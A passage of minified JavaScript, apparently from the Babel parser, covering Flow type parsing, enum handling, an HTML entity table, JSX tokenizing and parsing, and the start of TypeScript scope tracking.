W=this.startNode();if(W.id=this.flowParseRestrictedIdentifier(!0),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();else W.typeParameters=null;Y.push(this.finishNode(W,"ClassImplements"))}while(this.eat(12))}}checkGetterSetterParams(J){super.checkGetterSetterParams(J);let Y=this.getObjectOrClassMethodParams(J);if(Y.length>0){let W=Y[0];if(this.isThisParam(W)&&J.kind==="get")this.raise(l1.GetterMayNotHaveThisParam,W);else if(this.isThisParam(W))this.raise(l1.SetterMayNotHaveThisParam,W)}}parsePropertyNamePrefixOperator(J){J.variance=this.flowParseVariance()}parseObjPropValue(J,Y,W,G,H,$,z){if(J.variance)this.unexpected(J.variance.loc.start);delete J.variance;let U;if(this.match(47)&&!$){if(U=this.flowParseTypeParameterDeclaration(),!this.match(10))this.unexpected()}let K=super.parseObjPropValue(J,Y,W,G,H,$,z);if(U)(K.value||K).typeParameters=U;return K}parseFunctionParamType(J){if(this.eat(17)){if(J.type!=="Identifier")this.raise(l1.PatternIsOptional,J);if(this.isThisParam(J))this.raise(l1.ThisParamMayNotBeOptional,J);J.optional=!0}if(this.match(14))J.typeAnnotation=this.flowParseTypeAnnotation();else if(this.isThisParam(J))this.raise(l1.ThisParamAnnotationRequired,J);if(this.match(29)&&this.isThisParam(J))this.raise(l1.ThisParamNoDefault,J);return this.resetEndLocation(J),J}parseMaybeDefault(J,Y){let W=super.parseMaybeDefault(J,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(l1.TypeBeforeInitializer,W.typeAnnotation);return W}checkImportReflection(J){if(super.checkImportReflection(J),J.module&&J.importKind!=="value")this.raise(l1.ImportReflectionHasImportType,J.specifiers[0].loc.start)}parseImportSpecifierLocal(J,Y,W){Y.local=qq(J)?this.flowParseRestrictedIdentifier(!0,!0):this.parseIdentifier(),J.specifiers.push(this.finishImportSpecifier(Y,W))}isPotentialImportPhase(J){if(super.isPotentialImportPhase(J))return!0;if(this.isContextual(130)){if(!J)return!0;let Y=this.lookaheadCharCode();return Y===123||Y===42}return!J&&this.isContextual(87)}applyImportPhase(J,Y,W,G){if(super.applyImportPhase(J,Y,W,G),Y){if(!W&&this.match(65))return;J.exportKind=W==="type"?W:"value"}else{if(W==="type"&&this.match(55))this.unexpected();J.importKind=W==="type"||W==="typeof"?W:"value"}}parseImportSpecifier(J,Y,W,G,H){let $=J.imported,z=null;if($.type==="Identifier"){if($.name==="type")z="type";else if($.name==="typeof")z="typeof"}let U=!1;if(this.isContextual(93)&&!this.isLookaheadContextual("as")){let B=this.parseIdentifier(!0);if(z!==null&&!C6(this.state.type))J.imported=B,J.importKind=z,J.local=this.cloneIdentifier(B);else J.imported=$,J.importKind=null,J.local=this.parseIdentifier()}else{if(z!==null&&C6(this.state.type))J.imported=this.parseIdentifier(!0),J.importKind=z;else{if(Y)throw this.raise(x.ImportBindingIsString,J,{importName:$.value});J.imported=$,J.importKind=null}if(this.eatContextual(93))J.local=this.parseIdentifier();else U=!0,J.local=this.cloneIdentifier(J.imported)}let K=qq(J);if(W&&K)this.raise(l1.ImportTypeShorthandOnlyInPureImport,J);if(W||K)this.checkReservedType(J.local.name,J.local.loc.start,!0);if(U&&!W&&!K)this.checkReservedWord(J.local.name,J.loc.start,!0,!0);return this.finishImportSpecifier(J,"ImportSpecifier")}parseBindingAtom(){switch(this.state.type){case 78:return this.parseIdentifier(!0);default:return super.parseBindingAtom()}}parseFunctionParams(J,Y){let W=J.kind;if(W!=="get"&&W!=="set"&&this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration();super.parseFunctionParams(J,Y)}parseVarId(J,Y){if(super.parseVarId(J,Y),this.match(14))J.id.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(J.id)}parseAsyncArrowFromCallExpression(J,Y){if(this.match(14)){let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0,J.returnType=this.flowParseTypeAnnotation(),this.state.noAnonFunctionType=W}return super.parseAsyncArrowFromCallExpression(J,Y)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}parseMaybeAssign(J,Y){var W;let G=null,H;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(G=this.state.clone(),H=this.tryParse(()=>super.parseMaybeAssign(J,Y),G),!H.error)return H.node;let{context:U}=this.state,K=U[U.length-1];if(K===L0.j_oTag||K===L0.j_expr)U.pop()}if((W=H)!=null&&W.error||this.match(47)){var $,z;G=G||this.state.clone();let U,K=this.tryParse((q)=>{var Z;U=this.flowParseTypeParameterDeclaration();let M=this.forwardNoArrowParamsConversionAt(U,()=>{let R=super.parseMaybeAssign(J,Y);return this.resetStartLocationFromNode(R,U),R});if((Z=M.extra)!=null&&Z.parenthesized)q();let L=this.maybeUnwrapTypeCastExpression(M);if(L.type!=="ArrowFunctionExpression")q();return L.typeParameters=U,this.resetStartLocationFromNode(L,U),M},G),B=null;if(K.node&&this.maybeUnwrapTypeCastExpression(K.node).type==="ArrowFunctionExpression"){if(!K.error&&!K.aborted){if(K.node.async)this.raise(l1.UnexpectedTypeParameterBeforeAsyncArrowFunction,U);return K.node}B=K.node}if(($=H)!=null&&$.node)return this.state=H.failState,H.node;if(B)return this.state=K.failState,B;if((z=H)!=null&&z.thrown)throw H.error;if(K.thrown)throw K.error;throw this.raise(l1.UnexpectedTokenAfterTypeParameter,U)}return super.parseMaybeAssign(J,Y)}parseArrow(J){if(this.match(14)){let Y=this.tryParse(()=>{let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0;let G=this.startNode();if([G.typeAnnotation,J.predicate]=this.flowParseTypeAndPredicateInitialiser(),this.state.noAnonFunctionType=W,this.canInsertSemicolon())this.unexpected();if(!this.match(19))this.unexpected();return G});if(Y.thrown)return null;if(Y.error)this.state=Y.failState;J.returnType=Y.node.typeAnnotation?this.finishNode(Y.node,"TypeAnnotation"):null}return super.parseArrow(J)}shouldParseArrow(J){return this.match(14)||super.shouldParseArrow(J)}setArrowFunctionParameters(J,Y){if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(J.start)))J.params=Y;else super.setArrowFunctionParameters(J,Y)}checkParams(J,Y,W,G=!0){if(W&&this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(J.start)))return;for(let H=0;H<J.params.length;H++)if(this.isThisParam(J.params[H])&&H>0)this.raise(l1.ThisParamMustBeFirst,J.params[H]);super.checkParams(J,Y,W,G)}parseParenAndDistinguishExpression(J){return super.parseParenAndDistinguishExpression(J&&!this.state.noArrowAt.includes(this.sourceToOffsetPos(this.state.start)))}parseSubscripts(J,Y,W){if(J.type==="Identifier"&&J.name==="async"&&this.state.noArrowAt.includes(Y.index)){this.next();let G=this.startNodeAt(Y);G.callee=J,G.arguments=super.parseCallExpressionArguments(),J=this.finishNode(G,"CallExpression")}else if(J.type==="Identifier"&&J.name==="async"&&this.match(47)){let G=this.state.clone(),H=this.tryParse((z)=>this.parseAsyncArrowWithTypeParameters(Y)||z(),G);if(!H.error&&!H.aborted)return H.node;let $=this.tryParse(()=>super.parseSubscripts(J,Y,W),G);if($.node&&!$.error)return $.node;if(H.node)return this.state=H.failState,H.node;if($.node)return this.state=$.failState,$.node;throw H.error||$.error}return super.parseSubscripts(J,Y,W)}parseSubscript(J,Y,W,G){if(this.match(18)&&this.isLookaheadToken_lt()){if(G.optionalChainMember=!0,W)return G.stop=!0,J;this.next();let H=this.startNodeAt(Y);return H.callee=J,H.typeArguments=this.flowParseTypeParameterInstantiationInExpression(),this.expect(10),H.arguments=this.parseCallExpressionArguments(),H.optional=!0,this.finishCallExpression(H,!0)}else if(!W&&this.shouldParseTypes()&&(this.match(47)||this.match(51))){let H=this.startNodeAt(Y);H.callee=J;let $=this.tryParse(()=>{if(H.typeArguments=this.flowParseTypeParameterInstantiationCallOrNew(),this.expect(10),H.arguments=super.parseCallExpressionArguments(),G.optionalChainMember)H.optional=!1;return this.finishCallExpression(H,G.optionalChainMember)});if($.node){if($.error)this.state=$.failState;return $.node}}return super.parseSubscript(J,Y,W,G)}parseNewCallee(J){super.parseNewCallee(J);let Y=null;if(this.shouldParseTypes()&&this.match(47))Y=this.tryParse(()=>this.flowParseTypeParameterInstantiationCallOrNew()).node;J.typeArguments=Y}parseAsyncArrowWithTypeParameters(J){let Y=this.startNodeAt(J);if(this.parseFunctionParams(Y,!1),!this.parseArrow(Y))return;return super.parseArrowExpression(Y,void 0,!0)}readToken_mult_modulo(J){let Y=this.input.charCodeAt(this.state.pos+1);if(J===42&&Y===47&&this.state.hasFlowComment){this.state.hasFlowComment=!1,this.state.pos+=2,this.nextToken();return}super.readToken_mult_modulo(J)}readToken_pipe_amp(J){let Y=this.input.charCodeAt(this.state.pos+1);if(J===124&&Y===125){this.finishOp(9,2);return}super.readToken_pipe_amp(J)}parseTopLevel(J,Y){let W=super.parseTopLevel(J,Y);if(this.state.hasFlowComment)this.raise(l1.UnterminatedFlowComment,this.state.curPosition());return W}skipBlockComment(){if(this.hasPlugin("flowComments")&&this.skipFlowComment()){if(this.state.hasFlowComment)throw this.raise(l1.NestedFlowComment,this.state.startLoc);this.hasFlowCommentCompletion();let J=this.skipFlowComment();if(J)this.state.pos+=J,this.state.hasFlowComment=!0;return}return super.skipBlockComment(this.state.hasFlowComment?"*-/":"*/")}skipFlowComment(){let{pos:J}=this.state,Y=2;while([32,9].includes(this.input.charCodeAt(J+Y)))Y++;let W=this.input.charCodeAt(Y+J),G=this.input.charCodeAt(Y+J+1);if(W===58&&G===58)return Y+2;if(this.input.slice(Y+J,Y+J+12)==="flow-include")return Y+12;if(W===58&&G!==58)return Y;return!1}hasFlowCommentCompletion(){if(this.input.indexOf("*/",this.state.pos)===-1)throw this.raise(x.UnterminatedComment,this.state.curPosition())}flowEnumErrorBooleanMemberNotInitialized(J,{enumName:Y,memberName:W}){this.raise(l1.EnumBooleanMemberNotInitialized,J,{memberName:W,enumName:Y})}flowEnumErrorInvalidMemberInitializer(J,Y){return this.raise(!Y.explicitType?l1.EnumInvalidMemberInitializerUnknownType:Y.explicitType==="symbol"?l1.EnumInvalidMemberInitializerSymbolType:l1.EnumInvalidMemberInitializerPrimaryType,J,Y)}flowEnumErrorNumberMemberNotInitialized(J,Y){this.raise(l1.EnumNumberMemberNotInitialized,J,Y)}flowEnumErrorStringMemberInconsistentlyInitialized(J,Y){this.raise(l1.EnumStringMemberInconsistentlyInitialized,J,Y)}flowEnumMemberInit(){let J=this.state.startLoc,Y=()=>this.match(12)||this.match(8);switch(this.state.type){case 135:{let W=this.parseNumericLiteral(this.state.value);if(Y())return{type:"number",loc:W.loc.start,value:W};return{type:"invalid",loc:J}}case 134:{let W=this.parseStringLiteral(this.state.value);if(Y())return{type:"string",loc:W.loc.start,value:W};return{type:"invalid",loc:J}}case 85:case 86:{let W=this.parseBooleanLiteral(this.match(85));if(Y())return{type:"boolean",loc:W.loc.start,value:W};return{type:"invalid",loc:J}}default:return{type:"invalid",loc:J}}}flowEnumMemberRaw(){let J=this.state.startLoc,Y=this.parseIdentifier(!0),W=this.eat(29)?this.flowEnumMemberInit():{type:"none",loc:J};return{id:Y,init:W}}flowEnumCheckExplicitTypeMismatch(J,Y,W){let{explicitType:G}=Y;if(G===null)return;if(G!==W)this.flowEnumErrorInvalidMemberInitializer(J,Y)}flowEnumMembers({enumName:J,explicitType:Y}){let W=new Set,G={booleanMembers:[],numberMembers:[],stringMembers:[],defaultedMembers:[]},H=!1;while(!this.match(8)){if(this.eat(21)){H=!0;break}let $=this.startNode(),{id:z,init:U}=this.flowEnumMemberRaw(),K=z.name;if(K==="")continue;if(/^[a-z]/.test(K))this.raise(l1.EnumInvalidMemberName,z,{memberName:K,suggestion:K[0].toUpperCase()+K.slice(1),enumName:J});if(W.has(K))this.raise(l1.EnumDuplicateMemberName,z,{memberName:K,enumName:J});W.add(K);let B={enumName:J,explicitType:Y,memberName:K};switch($.id=z,U.type){case"boolean":{this.flowEnumCheckExplicitTypeMismatch(U.loc,B,"boolean"),$.init=U.value,G.booleanMembers.push(this.finishNode($,"EnumBooleanMember"));break}case"number":{this.flowEnumCheckExplicitTypeMismatch(U.loc,B,"number"),$.init=U.value,G.numberMembers.push(this.finishNode($,"EnumNumberMember"));break}case"string":{this.flowEnumCheckExplicitTypeMismatch(U.loc,B,"string"),$.init=U.value,G.stringMembers.push(this.finishNode($,"EnumStringMember"));break}case"invalid":throw this.flowEnumErrorInvalidMemberInitializer(U.loc,B);case"none":switch(Y){case"boolean":this.flowEnumErrorBooleanMemberNotInitialized(U.loc,B);break;case"number":this.flowEnumErrorNumberMemberNotInitialized(U.loc,B);break;default:G.defaultedMembers.push(this.finishNode($,"EnumDefaultedMember"))}}if(!this.match(8))this.expect(12)}return{members:G,hasUnknownMembers:H}}flowEnumStringMembers(J,Y,{enumName:W}){if(J.length===0)return Y;else if(Y.length===0)return J;else if(Y.length>J.length){for(let G of J)this.flowEnumErrorStringMemberInconsistentlyInitialized(G,{enumName:W});return Y}else{for(let G of Y)this.flowEnumErrorStringMemberInconsistentlyInitialized(G,{enumName:W});return J}}flowEnumParseExplicitType({enumName:J}){if(!this.eatContextual(102))return null;if(!w0(this.state.type))throw this.raise(l1.EnumInvalidExplicitTypeUnknownSupplied,this.state.startLoc,{enumName:J});let{value:Y}=this.state;if(this.next(),Y!=="boolean"&&Y!=="number"&&Y!=="string"&&Y!=="symbol")this.raise(l1.EnumInvalidExplicitType,this.state.startLoc,{enumName:J,invalidEnumType:Y});return Y}flowEnumBody(J,Y){let W=Y.name,G=Y.loc.start,H=this.flowEnumParseExplicitType({enumName:W});this.expect(5);let{members:$,hasUnknownMembers:z}=this.flowEnumMembers({enumName:W,explicitType:H});switch(J.hasUnknownMembers=z,H){case"boolean":return J.explicitType=!0,J.members=$.booleanMembers,this.expect(8),this.finishNode(J,"EnumBooleanBody");case"number":return J.explicitType=!0,J.members=$.numberMembers,this.expect(8),this.finishNode(J,"EnumNumberBody");case"string":return J.explicitType=!0,J.members=this.flowEnumStringMembers($.stringMembers,$.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(J,"EnumStringBody");case"symbol":return J.members=$.defaultedMembers,this.expect(8),this.finishNode(J,"EnumSymbolBody");default:{let U=()=>{return J.members=[],this.expect(8),this.finishNode(J,"EnumStringBody")};J.explicitType=!1;let K=$.booleanMembers.length,B=$.numberMembers.length,q=$.stringMembers.length,Z=$.defaultedMembers.length;if(!K&&!B&&!q&&!Z)return U();else if(!K&&!B)return J.members=this.flowEnumStringMembers($.stringMembers,$.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(J,"EnumStringBody");else if(!B&&!q&&K>=Z){for(let M of $.defaultedMembers)this.flowEnumErrorBooleanMemberNotInitialized(M.loc.start,{enumName:W,memberName:M.id.name});return J.members=$.booleanMembers,this.expect(8),this.finishNode(J,"EnumBooleanBody")}else if(!K&&!q&&B>=Z){for(let M of $.defaultedMembers)this.flowEnumErrorNumberMemberNotInitialized(M.loc.start,{enumName:W,memberName:M.id.name});return J.members=$.numberMembers,this.expect(8),this.finishNode(J,"EnumNumberBody")}else return this.raise(l1.EnumInconsistentMemberValues,G,{enumName:W}),U()}}}flowParseEnumDeclaration(J){let Y=this.parseIdentifier();return J.id=Y,J.body=this.flowEnumBody(this.startNode(),Y),this.finishNode(J,"EnumDeclaration")}jsxParseOpeningElementAfterName(J){if(this.shouldParseTypes()){if(this.match(47)||this.match(51))J.typeArguments=this.flowParseTypeParameterInstantiationInExpression()}return super.jsxParseOpeningElementAfterName(J)}isLookaheadToken_lt(){let J=this.nextTokenStart();if(this.input.charCodeAt(J)===60){let Y=this.input.charCodeAt(J+1);return Y!==60&&Y!==61}return!1}reScan_lt_gt(){let{type:J}=this.state;if(J===47)this.state.pos-=1,this.readToken_lt();else if(J===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:J}=this.state;if(J===51)return this.state.pos-=2,this.finishOp(47,1),47;return J}maybeUnwrapTypeCastExpression(J){return J.type==="TypeCastExpression"?J.expression:J}},Tv={__proto__:null,quot:'"',amp:"&",apos:"'",lt:"<",gt:">",nbsp:"",iexcl:"",cent:"",pound:"",curren:"",yen:"",brvbar:"",sect:"",uml:"",copy:"",ordf:"",laquo:"",not:"",shy:"",reg:"",macr:"",deg:"",plusmn:"",sup2:"",sup3:"",acute:"",micro:"",para:"",middot:"",cedil:"",sup1:"",ordm:"",raquo:"",frac14:"",frac12:"",frac34:"",iquest:"",Agrave:"",Aacute:"",Acirc:"",Atilde:"",Auml:"",Aring:"",AElig:"",Ccedil:"",Egrave:"",Eacute:"",Ecirc:"",Euml:"",Igrave:"",Iacute:"",Icirc:"",Iuml:"",ETH:"",Ntilde:"",Ograve:"",Oacute:"",Ocirc:"",Otilde:"",Ouml:"",times:"",Oslash:"",Ugrave:"",Uacute:"",Ucirc:"",Uuml:"",Yacute:"",THORN:"",szlig:"",agrave:"",aacute:"",acirc:"",atilde:"",auml:"",aring:"",aelig:"",ccedil:"",egrave:"",eacute:"",ecirc:"",euml:"",igrave:"",iacute:"",icirc:"",iuml:"",eth:"",ntilde:"",ograve:"",oacute:"",ocirc:"",otilde:"",ouml:"",divide:"",oslash:"",ugrave:"",uacute:"",ucirc:"",uuml:"",yacute:"",thorn:"",yuml:"",OElig:"",oelig:"",Scaron:"",scaron:"",Yuml:"",fnof:"",circ:"",tilde:"",Alpha:"",Beta:"",Gamma:"",Delta:"",Epsilon:"",Zeta:"",Eta:"",Theta:"",Iota:"",Kappa:"",Lambda:"",Mu:"",Nu:"",Xi:"",Omicron:"",Pi:"",Rho:"",Sigma:"",Tau:"",Upsilon:"",Phi:"",Chi:"",Psi:"",Omega:"",alpha:"",beta:"",gamma:"",delta:"",epsilon:"",zeta:"",eta:"",theta:"",iota:"",kappa:"",lambda:"",mu:"",nu:"",xi:"",omicron:"",pi:"",rho:"",sigmaf:"",sigma:"",tau:"",upsilon:"",phi:"",chi:"",psi:"",omega:"",thetasym:"",upsih:"",piv:"",ensp:"",emsp:"",thinsp:"",zwnj:"",zwj:"",lrm:"",rlm:"",ndash:"",mdash:"",lsquo:"",rsquo:"",sbquo:"",ldquo:"",rdquo:"",bdquo:"",dagger:"",Dagger:"",bull:"",hellip:"",permil:"",prime:"",Prime:"",lsaquo:"",rsaquo:"",oline:"",frasl:"",euro:"",image:"",weierp:"",real:"",trade:"",alefsym:"",larr:"",uarr:"",rarr:"",darr:"",harr:"",crarr:"",lArr:"",uArr:"",rArr:"",dArr:"",hArr:"",forall:"",part:"",exist:"",empty:"",nabla:"",isin:"",notin:"",ni:"",prod:"",sum:"",minus:"",lowast:"",radic:"",prop:"",infin:"",ang:"",and:"",or:"",cap:"",cup:"",int:"",there4:"",sim:"",cong:"",asymp:"",ne:"",equiv:"",le:"",ge:"",sub:"",sup:"",nsub:"",sube:"",supe:"",oplus:"",otimes:"",perp:"",sdot:"",lceil:"",rceil:"",lfloor:"",rfloor:"",lang:"",rang:"",loz:"",spades:"",clubs:"",hearts:"",diams:""},_v=/\r\n|[\r\n\u2028\u2029]/,pJ=new RegExp(_v.source,"g");function Q5(X){switch(X){case 10:case 13:case 8232:case 8233:return!0;default:return!1}}function Zq(X,Q,J){for(let Y=Q;Y<J;Y++)if(Q5(X.charCodeAt(Y)))return!0;return!1}var jH=/(?:\s|\/\/.*|\/\*[^]*?\*\/)*/g,FH=/(?:[^\S\n\r\u2028\u2029]|\/\/.*|\/\*.*?\*\/)*/g;function kv(X){switch(X){case 9:case 11:case 12:case 32:case 160:case 5760:case 8192:case 8193:case 8194:case 8195:case 8196:case 8197:case 8198:case 8199:case 8200:case 8201:case 8202:case 8239:case 8287:case 12288:case 65279:return!0;default:return!1}}var pX=n6`jsx`({AttributeIsEmpty:"JSX attributes must only be assigned a non-empty expression.",MissingClosingTagElement:({openingTagName:X})=>`Expected corresponding JSX closing tag for <${X}>.`,MissingClosingTagFragment:"Expected corresponding JSX closing tag for <>.",UnexpectedSequenceExpression:"Sequence expressions cannot be directly nested inside JSX. Did you mean to wrap it in parentheses (...)?",UnexpectedToken:({unexpected:X,HTMLEntity:Q})=>`Unexpected token \`${X}\`. Did you mean \`${Q}\` or \`{'${X}'}\`?`,UnsupportedJsxValue:"JSX value should be either an expression or a quoted JSX text.",UnterminatedJsxContent:"Unterminated JSX contents.",UnwrappedAdjacentJSXElements:"Adjacent JSX elements must be wrapped in an enclosing tag. Did you want a JSX fragment <>...</>?"});function UX(X){return X?X.type==="JSXOpeningFragment"||X.type==="JSXClosingFragment":!1}function e7(X){if(X.type==="JSXIdentifier")return X.name;if(X.type==="JSXNamespacedName")return X.namespace.name+":"+X.name.name;if(X.type==="JSXMemberExpression")return e7(X.object)+"."+e7(X.property);throw Error("Node had unexpected type: "+X.type)}var bv=(X)=>class extends X{jsxReadToken(){let J="",Y=this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(pX.UnterminatedJsxContent,this.state.startLoc);let W=this.input.charCodeAt(this.state.pos);switch(W){case 60:case 123:if(this.state.pos===this.state.start){if(W===60&&this.state.canStartJSXElement)++this.state.pos,this.finishToken(143);else super.getTokenFromCode(W);return}J+=this.input.slice(Y,this.state.pos),this.finishToken(142,J);return;case 38:J+=this.input.slice(Y,this.state.pos),J+=this.jsxReadEntity(),Y=this.state.pos;break;case 62:case 125:default:if(Q5(W))J+=this.input.slice(Y,this.state.pos),J+=this.jsxReadNewLine(!0),Y=this.state.pos;else++this.state.pos}}}jsxReadNewLine(J){let Y=this.input.charCodeAt(this.state.pos),W;if(++this.state.pos,Y===13&&this.input.charCodeAt(this.state.pos)===10)++this.state.pos,W=J?`
`:`\r
`;else W=String.fromCharCode(Y);return++this.state.curLine,this.state.lineStart=this.state.pos,W}jsxReadString(J){let Y="",W=++this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(x.UnterminatedString,this.state.startLoc);let G=this.input.charCodeAt(this.state.pos);if(G===J)break;if(G===38)Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadEntity(),W=this.state.pos;else if(Q5(G))Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadNewLine(!1),W=this.state.pos;else++this.state.pos}Y+=this.input.slice(W,this.state.pos++),this.finishToken(134,Y)}jsxReadEntity(){let J=++this.state.pos;if(this.codePointAtPos(this.state.pos)===35){++this.state.pos;let Y=10;if(this.codePointAtPos(this.state.pos)===120)Y=16,++this.state.pos;let W=this.readInt(Y,void 0,!1,"bail");if(W!==null&&this.codePointAtPos(this.state.pos)===59)return++this.state.pos,String.fromCodePoint(W)}else{let Y=0,W=!1;while(Y++<10&&this.state.pos<this.length&&!(W=this.codePointAtPos(this.state.pos)===59))++this.state.pos;if(W){let G=this.input.slice(J,this.state.pos),H=Tv[G];if(++this.state.pos,H)return H}}return this.state.pos=J,"&"}jsxReadWord(){let J,Y=this.state.pos;do J=this.input.charCodeAt(++this.state.pos);while(X5(J)||J===45);this.finishToken(141,this.input.slice(Y,this.state.pos))}jsxParseIdentifier(){let J=this.startNode();if(this.match(141))J.name=this.state.value;else if(TH(this.state.type))J.name=VX(this.state.type);else this.unexpected();return this.next(),this.finishNode(J,"JSXIdentifier")}jsxParseNamespacedName(){let J=this.state.startLoc,Y=this.jsxParseIdentifier();if(!this.eat(14))return Y;let W=this.startNodeAt(J);return W.namespace=Y,W.name=this.jsxParseIdentifier(),this.finishNode(W,"JSXNamespacedName")}jsxParseElementName(){let J=this.state.startLoc,Y=this.jsxParseNamespacedName();if(Y.type==="JSXNamespacedName")return Y;while(this.eat(16)){let W=this.startNodeAt(J);W.object=Y,W.property=this.jsxParseIdentifier(),Y=this.finishNode(W,"JSXMemberExpression")}return Y}jsxParseAttributeValue(){let J;switch(this.state.type){case 5:if(J=this.startNode(),this.setContext(L0.brace),this.next(),J=this.jsxParseExpressionContainer(J,L0.j_oTag),J.expression.type==="JSXEmptyExpression")this.raise(pX.AttributeIsEmpty,J);return J;case 143:case 134:return this.parseExprAtom();default:throw this.raise(pX.UnsupportedJsxValue,this.state.startLoc)}}jsxParseEmptyExpression(){let J=this.startNodeAt(this.state.lastTokEndLoc);return this.finishNodeAt(J,"JSXEmptyExpression",this.state.startLoc)}jsxParseSpreadChild(J){return this.next(),J.expression=this.parseExpression(),this.setContext(L0.j_expr),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(J,"JSXSpreadChild")}jsxParseExpressionContainer(J,Y){if(this.match(8))J.expression=this.jsxParseEmptyExpression();else{let W=this.parseExpression();J.expression=W}return this.setContext(Y),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(J,"JSXExpressionContainer")}jsxParseAttribute(){let J=this.startNode();if(this.match(5))return this.setContext(L0.brace),this.next(),this.expect(21),J.argument=this.parseMaybeAssignAllowIn(),this.setContext(L0.j_oTag),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(J,"JSXSpreadAttribute");return J.name=this.jsxParseNamespacedName(),J.value=this.eat(29)?this.jsxParseAttributeValue():null,this.finishNode(J,"JSXAttribute")}jsxParseOpeningElementAt(J){let Y=this.startNodeAt(J);if(this.eat(144))return this.finishNode(Y,"JSXOpeningFragment");return Y.name=this.jsxParseElementName(),this.jsxParseOpeningElementAfterName(Y)}jsxParseOpeningElementAfterName(J){let Y=[];while(!this.match(56)&&!this.match(144))Y.push(this.jsxParseAttribute());return J.attributes=Y,J.selfClosing=this.eat(56),this.expect(144),this.finishNode(J,"JSXOpeningElement")}jsxParseClosingElementAt(J){let Y=this.startNodeAt(J);if(this.eat(144))return this.finishNode(Y,"JSXClosingFragment");return Y.name=this.jsxParseElementName(),this.expect(144),this.finishNode(Y,"JSXClosingElement")}jsxParseElementAt(J){let Y=this.startNodeAt(J),W=[],G=this.jsxParseOpeningElementAt(J),H=null;if(!G.selfClosing){X:for(;;)switch(this.state.type){case 143:if(J=this.state.startLoc,this.next(),this.eat(56)){H=this.jsxParseClosingElementAt(J);break X}W.push(this.jsxParseElementAt(J));break;case 142:W.push(this.parseLiteral(this.state.value,"JSXText"));break;case 5:{let $=this.startNode();if(this.setContext(L0.brace),this.next(),this.match(21))W.push(this.jsxParseSpreadChild($));else W.push(this.jsxParseExpressionContainer($,L0.j_expr));break}default:this.unexpected()}if(UX(G)&&!UX(H)&&H!==null)this.raise(pX.MissingClosingTagFragment,H);else if(!UX(G)&&UX(H))this.raise(pX.MissingClosingTagElement,H,{openingTagName:e7(G.name)});else if(!UX(G)&&!UX(H)){if(e7(H.name)!==e7(G.name))this.raise(pX.MissingClosingTagElement,H,{openingTagName:e7(G.name)})}}if(UX(G))Y.openingFragment=G,Y.closingFragment=H;else Y.openingElement=G,Y.closingElement=H;if(Y.children=W,this.match(47))throw this.raise(pX.UnwrappedAdjacentJSXElements,this.state.startLoc);return UX(G)?this.finishNode(Y,"JSXFragment"):this.finishNode(Y,"JSXElement")}jsxParseElement(){let J=this.state.startLoc;return this.next(),this.jsxParseElementAt(J)}setContext(J){let{context:Y}=this.state;Y[Y.length-1]=J}parseExprAtom(J){if(this.match(143))return this.jsxParseElement();else if(this.match(47)&&this.input.charCodeAt(this.state.pos)!==33)return this.replaceToken(143),this.jsxParseElement();else return super.parseExprAtom(J)}skipSpace(){if(!this.curContext().preserveSpace)super.skipSpace()}getTokenFromCode(J){let Y=this.curContext();if(Y===L0.j_expr){this.jsxReadToken();return}if(Y===L0.j_oTag||Y===L0.j_cTag){if(I8(J)){this.jsxReadWord();return}if(J===62){++this.state.pos,this.finishToken(144);return}if((J===34||J===39)&&Y===L0.j_oTag){this.jsxReadString(J);return}}if(J===60&&this.state.canStartJSXElement&&this.input.charCodeAt(this.state.pos+1)!==33){++this.state.pos,this.finishToken(143);return}super.getTokenFromCode(J)}updateContext(J){let{context:Y,type:W}=this.state;if(W===56&&J===143)Y.splice(-2,2,L0.j_cTag),this.state.canStartJSXElement=!1;else if(W===143)Y.push(L0.j_oTag);else if(W===144){let G=Y[Y.length-1];if(G===L0.j_oTag&&J===56||G===L0.j_cTag)Y.pop(),this.state.canStartJSXElement=Y[Y.length-1]===L0.j_expr;else this.setContext(L0.j_expr),this.state.canStartJSXElement=!0}else this.state.canStartJSXElement=Gv(W)}};class kq extends oJ{constructor(...X){super(...X);this.tsNames=new Map}}class bq extends sJ{constructor(...X){super(...X);this.importsStack=[]}createScope(X){return this.importsStack.push(new Set),new kq(X)}enter(X){if(X===1024)this.importsStack.push(new Set);super.enter(X)}exit(){let X=super.exit();if(X===1024)this.importsStack.pop();return X}hasImport(X,Q){let J=this.importsStack.length;if(this.importsStack[J-1].has(X))return!0;if(!Q&&J>1){for(let Y=0;Y<J-1;Y++)if(this.importsStack[Y].has(X))return!0}return!1}declareName(X,Q,J){if(Q&4096){if(this.hasImport(X,!0))this.parser.raise(x.VarRedeclaration,J,{identifierName:X});this.importsStack[this.importsStack.length-1].add(X);return}let Y=this.currentScope(),W=Y.tsNames.get(X)||0;if(Q&1024){this.maybeExportDefined(Y,X),Y.tsNames.set(X,W|16);return}if(super.declareName(X,Q,J),Q&2){if(!(Q&1))this.checkRedeclarationInScope(Y,X,Q,J),this.maybeExportDefined(Y,X);W=W|1}if(Q&256)W=W|2;if(Q&512)W=W|4;if(Q&128)W=W|8;if(W)Y.tsNames.set(X,W)}isRedeclaredInScope(X,Q,J){let Y=X.tsNames.get(Q);if((Y&2)>0){if(J&256){let W=!!(J&512),G=(Y&4)>0;return W!==G}return!0}if(J&128&&(Y&8)>0)if(X.names.get(Q)&2)return!!(J&1);else return!1;if(J&2&&(Y&1)>0)return!0;return super.isRedeclaredInScope(X,Q,J)}checkLocalExport(X){let{name:Q}=X;if(this.hasImport(Q))return;let J=this.scopeStack.length;for(let Y=J-1;Y>=0;Y--){let 